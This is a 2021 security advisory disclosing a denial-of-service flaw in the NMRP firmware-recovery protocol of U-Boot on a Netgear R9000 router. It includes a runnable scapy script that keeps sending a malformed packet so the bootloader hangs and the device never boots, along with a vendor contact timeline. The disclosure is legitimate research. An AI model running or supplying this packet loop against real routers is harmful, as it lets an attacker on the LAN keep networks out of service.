# Denial of Service in NMRP Protocol

Published: April 1, 2021

CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H [6.5]

# Prior Art

[http://www.chubb.wattle.id.au/PeterChubb/nmrp.html](http://www.chubb.wattle.id.au/PeterChubb/nmrp.html)

[https://github.com/jclehner/nmrpflash](https://github.com/jclehner/nmrpflash)

## Overview

The NMRP protocol is a debug feature used to update firmware images on Netgear Routers over the LAN.  This protocol does not require authentication.  NMRP is a Layer 2 protocol based on Ethernet.  The NMRP daemon starts for three seconds before the U-Boot bootloader begins the boot process of the primary Linux operating system. This is evident by checking the `bootcmd` environment variable within U-Boot:

```
ALPINE_DB> printenv bootcmd
bootcmd=nmrp;run check_dni_image;run bootargsnand;qca8337_init_one; ledtoggle;sleep 1;run bootnand
```

This is the version of U-Boot testing was completed against as output from the U-Boot bootloader:

```
U-Boot 2015.01-gd836bbb (Jul 22 2016 - 13:32:00)
```

The specific device used for testing was a Netgear Nighthawk R9000 (x10) router.

## Vulnerability

Multiple memory corruption issues exist within the NMRP protocol implementation within U-Boot. Any of these vulnerabilities can be exploited to cause the bootloader to hang and no longer accept input from either the network or the primary UART console.  The only option is to cut the power in order to restart the device. This results in preventing the operating system from loading and thus the device being operable.  An attacker with a wired LAN connection can repeatedly emit these malicious packets so that every time the device attempts to boot, the vulnerability is triggered and the device doesn't boot into Linux.  The end result is an attacker on the wired LAN can prevent the router from ever achieving an operational state.

## Proof of Concept

A python-based proof of concept script is provided to demonstrate the vulnerability. You will need the `scapy` package installed in order to run this script.  `scapy` can be installed with pip: `pip3 install scapy`. Additionally, the script will need to be run with root privileges in order to send layer 2 packets.

```python
from scapy.all import *
import time

SRC_MAC_ADDRESS = "dc:a6:32:1b:1d:c6"
DST_MAC_ADDRESS = "cc:40:d0:5d:a2:84"

pkt = Ether(src=SRC_MAC_ADDRESS, dst=DST_MAC_ADDRESS, type=0x912) / b'\x00\x00\x01\x00\x00\x0e\x00\x01\x00\x00NTGR\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

while True:
  sendp(pkt, iface='eth0') # change iface to match ethernet NIC connected to router.
  time.sleep(0.95)
```

This vulnerability works by setting the options length to `0x0000` for the initial advertisement packet that is sent to initiate the firmware upload process. Note that you will need to change the `SRC_MAC_ADDRESS` and `DST_MAC_ADDRESS` variables to match your lab configuration, and you may need to change the value for `iface` in the `sendp` invocation to match your ethernet adapter which is connected to the router. The ethernet connection must be on the first ethernet port on the router.

## Extrapolation

During testing, many different packets were crafted and sent to the device.  Some crafted packets resulted in an error message and subsequent device reload. The aforementioned proof of concept is not the only packet which results in a device hang; there were too many combinations to list individually in this write up.  It is recommended that the vendor review the source code for the NMRP protocol and conduct an internal audit for additional memory corruption issues.

## Time Line

* January 31st, 2021: Notified Vendor of Vulnerability - stated intent to disclose April 1st, 2020.
* February 07, 2021: No response, sent reminder email asking for acknowledgement.
* February 15, 2021: No response, sent another reminder email asking for acknowledgement.
* February 21, 2021: No response, sent another reminder email asking for acknowledgement.
* February 21, 201: Tweeted @NETGEAR to attempt contact. [https://twitter.com/nstarke/status/1363552292729946113](https://twitter.com/nstarke/status/1363552292729946113)
* March 21, 2021: No response, sent another reminder email asking for acknowledgement.
* March 21, 2021: Tweeted @NETGEAR again to attempt contact. [https://twitter.com/nstarke/status/1373701891801104385](https://twitter.com/nstarke/status/1373701891801104385)
* March 24, 2021: Received tweet from @NETGEAR_UKI directing me to their bug bounty program. [https://twitter.com/NETGEAR_UKI/status/1374834049483599872](https://twitter.com/NETGEAR_UKI/status/1374834049483599872)
* March 24, 2021: Responded saying I cannot disclose through the bug bounty program.  [https://twitter.com/nstarke/status/1374834668177096705](https://twitter.com/nstarke/status/1374834668177096705)
* April 1, 2021: Public Disclosure